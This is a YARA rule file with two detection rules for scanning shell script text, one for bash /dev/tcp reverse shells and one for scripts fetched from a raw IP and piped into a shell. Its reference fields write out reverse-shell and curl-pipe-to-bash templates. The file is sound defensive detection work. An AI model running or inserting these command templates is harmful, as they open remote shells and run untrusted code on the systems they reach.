/*
   Unix shell abuse rules for generated-content scanning.
   Scope: shell script text. Synthetic corpus, documentation IPs only.
*/

rule Shell_Reverse_TCP_Bash
{
    meta:
        author      = "Elyse Paneral"
        description = "Interactive shell wired to a TCP socket via bash /dev/tcp (reverse shell)"
        family      = "shell.reverse"
        severity    = "critical"
        reference   = "bash -i >& /dev/tcp/<ip>/<port> 0>&1"
        date        = "2026-06"
    strings:
        $devtcp = "/dev/tcp/" ascii
        $bi     = "bash -i" ascii
        $si     = "sh -i" ascii
    condition:
        // /dev/tcp socket use is near-exclusively malicious; gating on an interactive
        // shell keeps it off benign scripts that merely redirect with ">&".
        $devtcp and ($bi or $si)
}

rule Shell_Pipe_To_Shell_From_IP
{
    meta:
        author      = "Elyse Paneral"
        description = "Remote script piped straight into a shell, fetched from a raw IP over http"
        family      = "shell.dropper"
        severity    = "high"
        reference   = "curl http://<ip>/x | bash"
        date        = "2026-06"
    strings:
        $ipurl     = /http:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/ ascii
        $fetch1    = "curl" ascii
        $fetch2    = "wget" ascii
        $pipe_bash = "| bash" ascii
        $pipe_sh   = "| sh" ascii
    condition:
        // The raw-IP-over-http source is the precision lever: the legitimate
        // rustup-style installer also pipes to a shell, but does so over https
        // from a named host, so $ipurl never matches it.
        $ipurl and ($fetch1 or $fetch2) and ($pipe_bash or $pipe_sh)
}
